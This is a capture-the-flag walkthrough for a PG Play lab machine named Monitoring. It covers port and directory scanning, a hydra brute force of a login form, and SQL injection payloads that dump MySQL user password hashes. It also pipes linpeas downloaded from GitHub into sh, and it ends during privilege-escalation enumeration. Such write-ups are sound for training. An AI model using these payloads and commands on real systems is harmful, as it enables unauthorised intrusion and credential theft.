# Monitoring --- PG Play
## [_Manual Exploitation_]
### Enumeration
First I assigned a value to `targ3t` variable in bash and passed it the IP address of the machine to make it easier to operate:
```
targ3t=192.168.247.148
```
Then I did an aggressive scan on the target using `nmap`:
```
nmap -A $targ3t -oN nmap.scan -vv
```
It seems we have only three open ports: `21`, `22` and `80`. Looks like anonymous login on FTP port 21 is allowed. Let's get in:
```
ftp $targ3t 21
```
Upon typing `ls` in this ftp console, we see there is a file named `pub` but we don't have permissions to "write" it, meaning in ftp terms, we cannot download it as an only measure to find out what's inside it. Moving on. SSH on port 22 doesn't seem vulnerable and `Apache/2.4.6` doesn't seem to be exploitable as per public exploit databases. So this leaves http:
```
feroxbuster -u http://$targ3t -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -o ferox.scan
```
`feroxbuster` has found a ton of routes for us to explore, most of them files and directory listings, but one page that stands out is `/monitoring` which appears to have a login form. Another page that caught my attention is `/news`, which seems like I shouldn't be seeing it (yet) and mentions a name of **Otis**. We can try a casual brute force on the login form with username `otis` and password list of `rockyou.txt`:
```
hydra -l otis -P /usr/share/wordlists/rockyou.txt $targ3t http-post-form "/monitoring/index.php:username=^USER^&password=^PASS^:F=Sign in"
```
We have a result of `login: otis` and `password: 123456`. Let's attempt to login at `/monitoring`. 

Once we log in we see that the dashboard allows the user to monitor certain servers by their IP address and in case of outage sends an email to the user. It so happens that ferox buster found a route named `/webmail` where we can test this user's credentials. 

It appears that we're in the user's email. Let's see if we can cause it to send us an email, by submitting `192.168.1.1` as server IP and wait for an email.

It took a minute for it to assess, that host is down and send email to Otis. The email seems to be pulling data from SQL about the host and its recent performance and render a table-like structure in the message with columns `ID`, `Host`, `Date Time`, etc. Let's try SQL injections. Press `Modify` on our latest entry of the server to be monitored and change the name to `" SHOW DATABASES;` 

Interesting. The host is still down, but the emails are no longer coming. Let's try `admin" UNION SELECT @@hostname,@@version,NULL,NULL;--+`

It appears that SQL Injection Vulnerability is confirmed. Let's draw some more information: `admin" UNION SELECT NULL,NULL,NULL,schema_name FROM information_schema.SCHEMATA;--+`

We have four databases, including one named `mysql`. Let's explore its table `user`: `admin" UNION SELECT 1, user, password, authentication_string FROM mysql.user;--+`

We get two users with their passwords in some hash format: `root` and `elliot`. Let's go to [crackstation.com](https://crackstation.com) and crack them. 

Only `elliot` user has crackable hash and the resulting password is `elliot123`. Let's try this pair on ssh:
```
ssh elliot@$targ3t
```
And we're in. Let's see what we have in the home folder:
```
ls
```
Looks like a local flag `local.txt`. Copy it, submit it and let's look for a root flag.
```
cat local.txt
```
Now let's see if we can escalate privileges. Type on elliot's SSH terminal:
```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee -a linpeas.out
```
Then let's try to locate CVEs it found:
```
cat linpeas.out | grep "CVE-"
```

